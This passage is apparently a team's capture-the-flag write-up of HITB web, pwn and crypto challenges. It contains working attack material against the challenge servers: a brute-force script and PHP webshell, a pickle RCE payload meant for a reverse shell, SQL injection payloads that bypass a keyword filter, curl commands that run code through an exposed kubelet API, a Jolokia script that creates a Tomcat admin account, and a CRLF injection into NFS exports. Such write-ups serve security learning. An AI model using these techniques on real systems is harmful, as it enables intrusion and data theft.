</code></pre><h2 id="web" style=""><a class="anchor hidden-xs" href="#web" title="web"><span class="octicon octicon-link"></span></a>web</h2><h3 id="Upload-bookgin" style=""><a class="anchor hidden-xs" href="#Upload-bookgin" title="Upload-bookgin"><span class="octicon octicon-link"></span></a>Upload (bookgin)</h3><h4 id="Find-the-target"><a class="anchor hidden-xs" href="#Find-the-target" title="Find-the-target"><span class="octicon octicon-link"></span></a>Find the target</h4><p>First, we can upload some images to the server. With some manual tests, we found we can upload <code>.PHP</code> to the server, since <code>.php</code> is WAFed. Addiotionally, we notice that the server OS is running Microsoft IIS, so the filesystem is case-insensitive.</p><p>Next, we have to dig how to access our webshell. We have no idea the directory name of the uploaded files.</p><p>Therefore, the objective is very clear: retrieve the path name of the directory.</p><p>It’s Windows+PHP, so let’s give this a try. Refer to <a href="http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf" target="_blank">onsec whiltepaper - 02</a> page 5. I even write a post about this feature in <a href="https://bookgin.github.io/2016/09/07/PHP-File-Access-in-Windows/" target="_blank">my blog</a> (in Chinese).</p><h4 id="Brute-force-the-path-and-RCE"><a class="anchor hidden-xs" href="#Brute-force-the-path-and-RCE" title="Brute-force-the-path-and-RCE"><span class="octicon octicon-link"></span></a>Brute force the path and RCE</h4><p>Here is the brute script:</p><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># Python 3.6.4</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> string
sess = requests.session()

name = <span class="hljs-string">''</span>
<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    print(name)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string.digits + string.ascii_letters:
        guess = name + str(i)
        <span class="hljs-keyword">if</span> <span class="hljs-string">'image error'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sess.get(<span class="hljs-string">'http://47.90.97.18:9999/pic.php?filename=../'</span> + guess + <span class="hljs-string">'%3C/1523462240.jpg'</span>).text:
            name += str(i)
            <span class="hljs-keyword">break</span>
</code></pre><p>We have RCE now. Next, we found the flag is in <code>../flag.php</code>, but some php useful function is disabled. A quick bypass is <code>highlight_file</code>. Here is the web shell:</p><pre><code class="php hljs"><span class="hljs-meta">&lt;?php</span>
error_reporting(E_ALL);

<span class="hljs-keyword">foreach</span> (glob(<span class="hljs-string">"../flag.php"</span>) <span class="hljs-keyword">as</span> $filename) {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"$filename size "</span> . filesize($filename) . <span class="hljs-string">"\n"</span>;
    highlight_file($filename);
}
</code></pre><p>The flag is <code>HITB{e5f476c1e4c6dc66278db95f0b5a228a}</code>.</p><h3 id="Python’s-revenge-sasdf" style=""><a class="anchor hidden-xs" href="#Python’s-revenge-sasdf" title="Python’s-revenge-sasdf"><span class="octicon octicon-link"></span></a>Python’s revenge (sasdf)</h3><p>Bruteforce 4 bytes cookie secret offline which is <code>hitb</code>. Once we have cookie secret, we can construct malicious pickle that trigger RCE in serverside by pickle’s <code>reduce</code> instruction. It has a large blacklist for filtering functions which are used to reduce, such as <code>os.system</code>. But it doesn’t reject to import them onto pickle stack. Call <code>__builtin__.map(os.system, [code])</code> to bypass blacklist.</p><h4 id="Payload"><a class="anchor hidden-xs" href="#Payload" title="Payload"><span class="octicon octicon-link"></span></a>Payload</h4><p>Replace <code>'echo 1337'</code> with repr of reverse shell payload that can be easily found on Internet. Use echo here for increasing readability.</p><pre><code class="python hljs"><span class="hljs-string">"c__builtin__\nrepr\np\nc__builtin__\nmap\np\n(cos\nsystem\n(lp0\nS'echo 1337'\np1\natp\nRp\nRp\n."</span>
</code></pre><h3 id="PHP-lover-bookgin-amp-sces60107" style=""><a class="anchor hidden-xs" href="#PHP-lover-bookgin-amp-sces60107" title="PHP-lover-bookgin-amp-sces60107"><span class="octicon octicon-link"></span></a>PHP lover (bookgin &amp; sces60107)</h3><h4 id="Possible-SQL-injection"><a class="anchor hidden-xs" href="#Possible-SQL-injection" title="Possible-SQL-injection"><span class="octicon octicon-link"></span></a>Possible SQL injection</h4><p>In the PHP source files, the report is very suspicious. The only way to create a report is to trigger an error here:</p><pre><code class="php hljs"><span class="hljs-keyword">if</span>(file_exists($avatar) <span class="hljs-keyword">and</span> filesize($avatar)&lt;<span class="hljs-number">65535</span>){
    $data=file_get_contents($avatar);
    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;user-&gt;updateavatar($data)) quit(<span class="hljs-string">'Something error!'</span>);
} 
<span class="hljs-keyword">else</span>{
    <span class="hljs-comment">//TODO！report it！</span>
    $out=<span class="hljs-string">"Your avatar is invalid, so we reported it"</span>.<span class="hljs-string">"&lt;/p&gt;"</span>;
    $report=<span class="hljs-keyword">$this</span>-&gt;user-&gt;getreport();
    <span class="hljs-keyword">if</span>($report){
        $out.=<span class="hljs-string">"Your last report used email "</span>.htmlspecialchars($report[<span class="hljs-number">2</span>],ENT_QUOTES).<span class="hljs-string">", and report type is "</span>.$report[<span class="hljs-number">3</span>];
    } 
    <span class="hljs-keyword">include</span>(<span class="hljs-string">"templates/error.html"</span>);
    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;user-&gt;report(<span class="hljs-number">1</span>)) quit(<span class="hljs-string">'Something error!'</span>);
    <span class="hljs-keyword">die</span>();
} 
</code></pre><p>Also, when insering a new report, it seems vulnerable to SQL injection. Unlike other edting features in the website, the email address here is not properly escaped through <code>addslashes()</code>.</p><pre><code class="php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">report</span><span class="hljs-params">($type_id)</span></span>{                                                                                                           
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;db-&gt;Insert(<span class="hljs-string">"reports"</span>,<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>-&gt;id,<span class="hljs-string">"'$this-&gt;email'"</span>,$type_id));
} 
</code></pre><p>But how to trigger this error in order to create a new report? We have to make the test failed <code>file_exists($avatar)</code>. The <code>$avatar</code> is the filepath of our avatar, and the fiepath is <code>upload/[USERNAME].png</code>. In order to make the file somehow “disappeared”, we can make avatar.filepath length limit <code>varchar(300)</code> in the SQL schema very long, because in the source code:</p><pre><code class="php hljs">$filename=<span class="hljs-string">"uploads/"</span>.<span class="hljs-keyword">$this</span>-&gt;user-&gt;getuser().<span class="hljs-string">"."</span>.$type;
<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">'avatar'</span>][<span class="hljs-string">'tmp_name'</span>])){
    <span class="hljs-keyword">$this</span>-&gt;user-&gt;edit(<span class="hljs-string">"avatar"</span>,<span class="hljs-keyword">array</span>($filename,$type));
</code></pre><p>Simply register a user with username length 300, and the avatar.filepath will be truncated.</p><p>Next, in order to exploit SQL injection, we have to bypass the email format regex check and another filter.</p><h4 id="Bypass-WAFs"><a class="anchor hidden-xs" href="#Bypass-WAFs" title="Bypass-WAFs"><span class="octicon octicon-link"></span></a>Bypass WAFs</h4><h5 id="Email-format-regex-check"><a class="anchor hidden-xs" href="#Email-format-regex-check" title="Email-format-regex-check"><span class="octicon octicon-link"></span></a>Email format regex check</h5><pre><code class="php hljs"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/^(([^&lt;&gt;()[\]\\.,;:\s@\"]+(\.[^&lt;&gt;()[\]\\.,;:\s@\"]+)*)|([\"].+[\"]))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/i'</span>,$value)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
</code></pre><p>Taking a closer look, we found it can be bypassed using double quotes. This is a valid email address <code>"', 17385)#'"@a.aa</code>.</p><h5 id="Hacker-Filter"><a class="anchor hidden-xs" href="#Hacker-Filter" title="Hacker-Filter"><span class="octicon octicon-link"></span></a>Hacker Filter</h5><pre><code class="php hljs">$preg=<span class="hljs-string">"\\b(benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\()|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@{1,2}.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|\'|\").*?(`|\'|\"))FROM(\\{.+\\}|\\(.+\\)|\\s+?.+?|(`|\'|\").*?(`|\'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;
<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/"</span>.$preg.<span class="hljs-string">"/is"</span>,$string)){
    <span class="hljs-keyword">die</span>(<span class="hljs-string">'hacker'</span>);
} 
</code></pre><p>This regex almost filters all the useful keywords in SQL. However, we note that the first character <code>b</code> in the regex, which means <a href="http://php.net/manual/en/function.preg-match.php#105924" target="_blank">word match</a>. Thus, we can just append a MySQL comment <code>/**/</code> to bypass the filter!</p><h4 id="Get-the-flag"><a class="anchor hidden-xs" href="#Get-the-flag" title="Get-the-flag"><span class="octicon octicon-link"></span></a>Get the flag</h4><p>The payload will be like this. In order to creat a valid SQL query, the <code>#</code> is required to comment out the trailing <code>@a.aa</code> in the email address.</p><pre><code>"', 12), (10272, (SELECT * FROM/**/ users), 9487)#"@a.aa
</code></pre><p>So the raw SQL query in the server side becomes:</p><pre><code>insert into reports (`...`, `...`) values 
(9453 , '"', 12), 
(10272, (SQLi PAYLOAD), 9487)#"@a.aa' , 1 )
</code></pre><p>After retriving the table and column name using group_concat and information_schema, we are able to get the flag.</p><p>Final payload: <code>"', 9453), (10272, (SELECT GROUP_CONCAT(fllllag_is_hhhhere) FROM/**/ fffflag_is_here), 9487)#"@a.aa</code></p><p>The flag is <code>HITB{2e9ular131mp0rt4nt}</code>.</p><p>Refer to <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" target="_blank">SQL injection cheatsheet by pentestmonkey</a></p><h3 id="baby-baby-bookgin" style=""><a class="anchor hidden-xs" href="#baby-baby-bookgin" title="baby-baby-bookgin"><span class="octicon octicon-link"></span></a>baby baby (bookgin)</h3><h4 id="Recon"><a class="anchor hidden-xs" href="#Recon" title="Recon"><span class="octicon octicon-link"></span></a>Recon</h4><p>The NMAP scanning result shows 3 ports are opened:</p><ul>
<li>80: HTTP + nginx</li>
<li>9999: HTTP + nginx</li>
<li>10250: HTTPS + unkownn backend</li>
</ul><p>First, the 80 port webserver is running PHP as backend. For the port 9999, it returns 403 forbidden when accessing the root. How about trying to access <code>index.php</code> ? To our surprise we got this:</p><pre><code class="php hljs">This is a pentest challenge, open your mind!                                                                                             
&lt;img style=<span class="hljs-string">"width: 300px;"</span> src=<span class="hljs-string">"jd.png"</span> alt=<span class="hljs-string">"the picture is unrelated to this challenge, just a advertisement"</span> /&gt;

<span class="hljs-meta">&lt;?php</span>
    <span class="hljs-keyword">eval</span>($__POST[<span class="hljs-string">"backdoor"</span>]);
<span class="hljs-meta">?&gt;</span>
</code></pre><p>Note that ther are 2 underscores. After wasting 2 hours on finding a way to exploit this backdoor, we think this direction is incorrect. It’s just a troll.</p><p>So how about the 10250 port? We use Dirbuster to brute force the filepath at a very low rate (2 request per second), to not affect other teams. Quickly it finds 2 intersting pages:</p><ul>
<li><a href="https://47.75.146.42:10250/metrics" target="_blank">https://47.75.146.42:10250/metrics</a></li>
<li><a href="https://47.75.146.42:10250/stats" target="_blank">https://47.75.146.42:10250/stats</a></li>
</ul><p>After Googling, this is related to kubelet API. Acctually, we can just Google the port number and found it. However we fotgot to do that… It’s really dumb to do directory name brute force.</p><p>Another quick Google, we found the kubelet API is vulnerable to RCE. Refer to <a href="https://github.com/bgeesaman/hhkbe" target="_blank">https://github.com/bgeesaman/hhkbe</a>, page P.35.</p><h4 id="RCE"><a class="anchor hidden-xs" href="#RCE" title="RCE"><span class="octicon octicon-link"></span></a>RCE</h4><ul>
<li>Get the info of running pods: <code>curl -sk https://47.75.146.42:10250/runningpods/</code></li>
<li>RCE: <code>curl -sk https://47.75.146.42:10250/run/esn-system/web-test-4092782360-035qx/web-test -d 'cmd=cat /flag.txt'</code></li>
</ul><p>The flag is <code>HITB{KKKKKKKKKKKKKKKKKKKKKKKKK}</code>. (The acronym of kubernetes is k8s)</p><h3 id="baby-nya-bookgin" style=""><a class="anchor hidden-xs" href="#baby-nya-bookgin" title="baby-nya-bookgin"><span class="octicon octicon-link"></span></a>baby nya (bookgin)</h3><p>The hint: <code>the tomcat deployed jolokia.war</code></p><h4 id="Exposed-Jserv-protocol"><a class="anchor hidden-xs" href="#Exposed-Jserv-protocol" title="Exposed-Jserv-protocol"><span class="octicon octicon-link"></span></a>Exposed Jserv protocol</h4><p>2 ports are open:</p><ul>
<li>8009: ajp13 Apache Jserv</li>
<li>9999: nginx HTTP</li>
</ul><p>The 9999 port will only return <code>&lt;h1&gt;debug port for admin, you can just ignore the port.&lt;/h1&gt;</code>. We trust him so we didn’t dig it deeper.</p><p>For the 8089 port, it exposes the Jserv protocol, we can set up a apache as a local proxy server to coonect tot the remote webserver. Refer to <a href="https://highon.coffee/blog/sleepy-ctf-walkthrough/#apache-tomcat-jserv-proxy-setup" target="_blank">https://highon.coffee/blog/sleepy-ctf-walkthrough/#apache-tomcat-jserv-proxy-setup</a> .</p><p>A quick dive into the webserver, we found the jolokia API can be used. For the document, refer to <a href="https://jolokia.org/reference/html/protocol.html" target="_blank">https://jolokia.org/reference/html/protocol.html</a> .</p><h4 id="Exploit-the-jolokia"><a class="anchor hidden-xs" href="#Exploit-the-jolokia" title="Exploit-the-jolokia"><span class="octicon octicon-link"></span></a>Exploit the jolokia</h4><p>Refer to <a href="https://paper.seebug.org/552/" target="_blank">https://paper.seebug.org/552/</a></p><ul>
<li>List APIs : <code>/jolokia/list</code></li>
<li>CreateAdmin Account and login: POST 3 jsons requests, Here is the script. You can use curl to send json request as well.</li>
</ul><pre><code>#!/usr/bin/env python3
# Python 3.6.4
import requests
import json
sess = requests.session()

payload = {
        'type':'EXEC',
        "mbean": "Users:database=UserDatabase,type=User,username=\"taiwannoooo1\"",
        #'mbean':'Users:database=UserDatabase,type=UserDatabase',
        'operation':'addRole',
        #'arguments':['manager-gui'],
        'arguments':['taiwannoooo1', 'TAIWAN', 'i_love_taiwan'],
}

response = sess.post('http://MY_SERVER_IP/jolokia', json=payload)

response_json = json.loads(response.text)
response_json = json.dumps(response_json, indent=2, sort_keys=True)
print(response_json)
print(response.status_code)
</code></pre><ul>
<li>Login to admin interface: <code>/manager/</code></li>
</ul><p>The flag is displayed in the manager interace. <code>HITB{TOMCAT_TOMCAT_KAWAII}</code></p><h3 id="baby-fs-unsolved-written-by-bookgin-thanks-to-the-organizer-QQ-group" style=""><a class="anchor hidden-xs" href="#baby-fs-unsolved-written-by-bookgin-thanks-to-the-organizer-QQ-group" title="baby-fs-unsolved-written-by-bookgin-thanks-to-the-organizer-QQ-group"><span class="octicon octicon-link"></span></a>baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)</h3><p><strong>This writeup is from organizer QQ group (not IRC).</strong></p><ul>
<li>The parameters: ip, permission, squash, path</li>
<li>Problem name: baby fs</li>
<li>HTML title: CFS</li>
</ul><p>With the knowledge above, one should know it’s a NFS server. The page seems to update <code>/etc/exports</code> per key.</p><p>Then, the ip parameter can accpeted ip range <code>1.2.3.4/24</code>, and it seems vulnerable to CRLF injection.</p><p>The payload is  <code>http://47.75.35.123:9999/?action=create&amp;key=8ce29e523ed35f49c7eb38b63c91f269&amp;ip=140.112.0.0%0A/%20*&amp;permission=rw&amp;squash=no_root_squash</code>.</p><p>Then, listing the root directory through <code>http://47.75.35.123:9999/?action=list&amp;key=8ce29e523ed35f49c7eb38b63c91f269&amp;path=/</code> shows the flag.</p><p>The flag is <code>HITB{----&gt;}!}&lt;0&gt;cccc}</code>.</p><p>I think this challenge requires some guessing. Until the competition ends, icchy (Tokyo westerns) is the only one who solves this challenge. Additionally, they solve it very quickly after the challenge releases. Congraz to them. They definitely have brorder knowledge!</p><h3 id="3pigs-unsolved-written-by-how2hack" style=""><a class="anchor hidden-xs" href="#3pigs-unsolved-written-by-how2hack" title="3pigs-unsolved-written-by-how2hack"><span class="octicon octicon-link"></span></a>3pigs (unsolved, written by how2hack)</h3><h4 id="Hint"><a class="anchor hidden-xs" href="#Hint" title="Hint"><span class="octicon octicon-link"></span></a>Hint</h4><blockquote>
<ol>
<li>this is web pwn</li>
<li>Go, I put everything there-----github</li>
<li>you can make the size of topchunk very small</li>
<li><a href="https://github.com/thr33pigs/3pigs/tree/master/ctf" target="_blank">https://github.com/thr33pigs/3pigs/tree/master/ctf</a></li>
<li>fix the flag</li>
</ol>
</blockquote><h4 id="Web-Challenge-WutFace"><a class="anchor hidden-xs" href="#Web-Challenge-WutFace" title="Web-Challenge-WutFace"><span class="octicon octicon-link"></span></a>Web Challenge? WutFace</h4><p>You can get the source code from the given Github link.<br>
The webserver using Flask(Python) as backend and connect to another server (which is the 3pigs binary).<br>
The vulnerabilities basically not related to web so I think the first hint make sense. &gt;_&gt;<br>
User uses this website to make actions and the webserver will communicate with the binary server and return the given responses to the user.</p><h4 id="First-stage-Misc"><a class="anchor hidden-xs" href="#First-stage-Misc" title="First-stage-Misc"><span class="octicon octicon-link"></span></a>First stage (Misc)</h4><p>Before checking the binary, I noticed that there is a kind of “flying pig” that needs a special <code>secret</code> code to be able to make it online.</p><pre><code class="python hljs"><span class="hljs-meta">@shop.route('/flypig.php', methods=['POST'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">flypig</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> isadmin(session):
        <span class="hljs-keyword">return</span> alert(<span class="hljs-string">"Not Login!"</span>)
    <span class="hljs-keyword">try</span>:
        secret = request.form.get(<span class="hljs-string">'secret'</span>,<span class="hljs-keyword">None</span>)
        secret = secret.decode(<span class="hljs-string">"base64"</span>)[:<span class="hljs-number">0xc0</span>]
        useflypig = getb(session).getpigs()[<span class="hljs-number">-1</span>].status
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">'UOTp%I()&lt;&gt;S'</span>:
            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> secret:
                <span class="hljs-keyword">return</span> <span class="hljs-string">'Hacker'</span>
        secret = secret.format(<span class="hljs-string">""</span>)
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">'Input Error'</span>
    ret = getb(session).flypig(secret,useflypig) <span class="hljs-keyword">if</span> secret <span class="hljs-keyword">else</span> <span class="hljs-string">"No Secret"</span>
    <span class="hljs-keyword">if</span> ret == <span class="hljs-string">'Time Out'</span>:
        logout()
        <span class="hljs-keyword">return</span> ret
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> ret
</code></pre><p>And from the binary, there is a <code>flypig()</code> function:</p><pre><code class="C hljs"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">flypig</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"secret:"</span>);
    read_n_input(s1, <span class="hljs-number">9</span>);
    <span class="hljs-keyword">if</span> ( unk_203090 || <span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">"UOTp%I&lt;S"</span>, <span class="hljs-number">8u</span>LL) )
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error_4"</span>);
    }
    <span class="hljs-keyword">else</span>
    {
        unk_203088 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x70</span>uLL);
        unk_203090 = <span class="hljs-number">1</span>;
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Success"</span>);
    }
}
</code></pre><p>Obviously, the <code>secret</code> code is <code>UOTp%I&lt;S</code>.<br>
However, the webserver filtered all these characters, which means you can’t use this function at all! (really?)</p><h4 id="Python-Format-String-Vulnerability"><a class="anchor hidden-xs" href="#Python-Format-String-Vulnerability" title="Python-Format-String-Vulnerability"><span class="octicon octicon-link"></span></a>Python Format String Vulnerability</h4><p>I was wondering why <code>secret = secret.format("")</code> is in the code, so I try to Google it and I found <a href="http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/" target="_blank">http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/</a> about danger of Python Format String function, pretty interesting…<br>
The idea is, we can use the attribute of python <code>str</code> and also the format string feature to create the <code>secret</code> code.</p><pre><code>&gt;&gt;&gt; dir('')
['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_formatter_field_name_split', '_formatter_parser', 'capitalize', 'center', 'count', 'decode', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'index', 'isalnum', 'isalpha', 'isdigit', 'islower', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']

&gt;&gt;&gt; ''.__doc__
"str(object='') -&gt; string\n\nReturn a nice string representation of the object.\nIf the argument is a string, the return value is the same object."

&gt;&gt;&gt; ''.__doc__[77]
'I'
</code></pre><p>Basically all the attribute itself has <code>__doc__</code>, so try to find every characters you need from <code>str</code> attributes.</p><pre><code>&gt;&gt;&gt; secret = '{0.__getslice__.__doc__[56]}{0.count.__doc__[128]}{0.__new__.__doc__[0]}{0.count.__doc__[129]}{0.__mod__.__doc__[19]}{0.__class__.__doc__[77]}{0.__le__.__doc__[12]}{0.count.__doc__[0]}'
&gt;&gt;&gt; secret.format('')
'UOTp%I&lt;S'
</code></pre><p>Payload: <code>{0.__getslice__.__doc__[56]}{0.count.__doc__[128]}{0.__new__.__doc__[0]}{0.count.__doc__[129]}{0.__mod__.__doc__[19]}{0.__class__.__doc__[77]}{0.__le__.__doc__[12]}{0.count.__doc__[0]}</code></p><h4 id="Second-stage-Pwn"><a class="anchor hidden-xs" href="#Second-stage-Pwn" title="Second-stage-Pwn"><span class="octicon octicon-link"></span></a>Second stage (Pwn)</h4><pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p>There are 5 functions:</p><ol>
<li>Add a pig (<code>malloc(0xc8)</code>, max=3)</li>
<li>Free a pig (<code>free(pig)</code>, and set pointer to <code>'\0'</code>)</li>
<li>Get pigs (Print out the info of all pigs)</li>
<li>Flypig (A special pig that need a <code>secret</code> code, <code>malloc(0x70)</code>, can only use once, cannot be freed)</li>
<li>Flying (Give “Flypig” 16 bytes data, can only use once)</li>
</ol><p>The structure of a normal pig:</p><pre><code>+----------------+----------------+ &lt;- current
|                |   size(0xd0)   |
+----------------+----------------+
|    pig_name    |    (unused)    |
+----------------+----------------+
|                                 |
|           data (0xb8)           |
|                                 |
|                +----------------+ &lt;- next 
|                | topchunk_size  |
+----------------+----------------+
</code></pre><h4 id="Vulnerability4"><a class="anchor hidden-xs" href="#Vulnerability4" title="Vulnerability4"><span class="octicon octicon-link"></span></a>Vulnerability</h4><ul>
<li>one-byte-off</li>
</ul><pre><code class="C hljs"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">read_input</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* buf, <span class="hljs-keyword">int</span> num)</span> </span>{
    v3 = read(<span class="hljs-number">0</span>, buf, num);
    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">0</span> )
    {
        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error_0"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
    }
    <span class="hljs-keyword">if</span> ( buf[v3 - <span class="hljs-number">1</span>] == <span class="hljs-string">'\n'</span> )
        buf[v3 - <span class="hljs-number">1</span>] = <span class="hljs-string">'\0'</span>;
    <span class="hljs-keyword">else</span>
        buf[v3] = <span class="hljs-string">'\0'</span>;
}
</code></pre><p>From the read_input function, if we read <code>num</code> chars, then it will trigger one-byte-off vulnerability. Basically we can use this to overwite <code>topchunk</code> size (as the hint said).</p><ul>
<li>Flying pig (overwrite next chunk first 16 bytes data)</li>
</ul><pre><code class="C hljs"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">flypig</span><span class="hljs-params">()</span> </span>{
    ...
    flypig_addr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x70</span>);
    ...
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">flying</span><span class="hljs-params">()</span> </span>{
    ...
    read_input((<span class="hljs-keyword">char</span> *)(flypig_addr + <span class="hljs-number">0x80</span>), <span class="hljs-number">16</span>);
    ...
}
</code></pre><p>Just as the pig’s name, this pig can “fly” to next chunk and overwrite first 16 bytes (17 if one-byte-off) of the data. Can use this to overwrite freed <code>fd</code> and <code>bk</code>.</p><pre><code>+----------------+----------------+ &lt;- flypig
|                |   size(0x80)   |
+----------------+----------------+
|                                 |
|        unused data (0x70)       |
|                                 |
+----------------+----------------+ &lt;- freed chunk 
|                |      size      |
+----------------+----------------+ &lt;- flying() input
|       fd       |       bk       |
+----------------+----------------+
</code></pre><h4 id="Solution…"><a class="anchor hidden-xs" href="#Solution…" title="Solution…"><span class="octicon octicon-link"></span></a>Solution…?</h4><ul>
<li>Leak libc address</li>
</ul><p>There are 3 different pigs <code>Ke Gua</code>, <code>Red Boy</code>, <code>Small Li</code>.<br>
The <code>addpig()</code> function will use <code>strncpy(buf, pig_name, pig_name_len)</code> to copy pig’s name to <code>pig_name</code>.<br>
Notice that <code>Small Li</code> is 8 bytes, so if we add this pig, we can leak the freed chunk <code>bk</code> pointer as no null byte will append after calling <code>strncpy</code>, then we can calculate libc address.</p><ul>
<li>Leak heap address</li>
</ul><p>Using the one-byte-off vulnerability, we can overwrite the <code>top_chunk</code> size and caused <code>sysmalloc</code> to create a new heap.<br>
Then use the same method above to leak heap address.</p><ul>
<li>…</li>
</ul><p>I was unable to solve this challenge in time as I couldn’t find a way to exploit. So close…</p><h2 id="crypto" style=""><a class="anchor hidden-xs" href="#crypto" title="crypto"><span class="octicon octicon-link"></span></a>crypto</h2><h3 id="easy_block-sasdf" style=""><a class="anchor hidden-xs" href="#easy_block-sasdf" title="easy_block-sasdf"><span class="octicon octicon-link"></span></a>easy_block (sasdf)</h3><h4 id="Vulnerability5"><a class="anchor hidden-xs" href="#Vulnerability5" title="Vulnerability5"><span class="octicon octicon-link"></span></a>Vulnerability</h4><ul>
<li>We have a service to compute mac for any plaintext.<pre><code class="python hljs"><span class="hljs-comment"># must be delete!</span>
<span class="hljs-keyword">elif</span> choice[<span class="hljs-number">0</span>] == <span class="hljs-string">'c'</span>:
    un = input(<span class="hljs-string">'your username:&gt;&gt;'</span>)
    un = bytes(un, <span class="hljs-string">'ISO-8859-1'</span>)
    print(sha256(mac_key + un).digest().hex())
</code></pre>
</li>
<li>Unpad function doesn’t check for valid padding that can trim more than 16 bytes.<pre><code class="python hljs"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unpad</span><span class="hljs-params">(s)</span>:</span>
    <span class="hljs-keyword">return</span> s[<span class="hljs-number">0</span>:-s[<span class="hljs-number">-1</span>]]
</code></pre>
</li>
<li>Leak 17 bytes of decrypted message.<pre><code class="python hljs">sha256(mac_key + plaintext).digest().hex()[<span class="hljs-number">-64</span>:<span class="hljs-number">-30</span>]
</code></pre>
</li>
<li>It check last 31.5 bytes of mac instead of whole string<pre><code class="python hljs">sha256(mac_key + plaintext).digest().hex()[<span class="hljs-number">-63</span>:] == hash.hex()[<span class="hljs-number">-63</span>:]
</code></pre>
</li>
</ul><h4 id="Construct-payload"><a class="anchor hidden-xs" href="#Construct-payload" title="Construct-payload"><span class="octicon octicon-link"></span></a>Construct payload</h4><p>Send <code>admin</code> as username, and we will get encrypted data of <code>adminuser</code>, modify the padding and trim off the suffix <code>user</code>. Use second and third blocks to construct a (48 - 5) bytes padding to avoid being affected by initial vector.</p><h4 id="Construct-hash"><a class="anchor hidden-xs" href="#Construct-hash" title="Construct-hash"><span class="octicon octicon-link"></span></a>Construct hash</h4><p>Use subroutine <code>c</code> to compute target hash. The initial vector is shared between payload and hash, we cannot modify the first 5 bytes because it will change our plaintext. Fortunately, padded message of hash is (32 + 16) bytes, and only last 31.5 bytes after unpad will be verified. So we can use ciphertext of <code>[5 bytes garbage][32 bytes hash]</code> as our mac, left first 5 bytes of initial vector unchanged. The ciphertext is constructed by xor previous block with desired plaintext and decrypted plaintext.</p><h3 id="easy_pub-sasdf" style=""><a class="anchor hidden-xs" href="#easy_pub-sasdf" title="easy_pub-sasdf"><span class="octicon octicon-link"></span></a>easy_pub (sasdf)</h3><pre><code class="python hljs">bytes_to_long(<span class="hljs-string">b'\x00\xff'</span>) == bytes_to_long(<span class="hljs-string">b'\xff'</span>) == <span class="hljs-number">255</span>
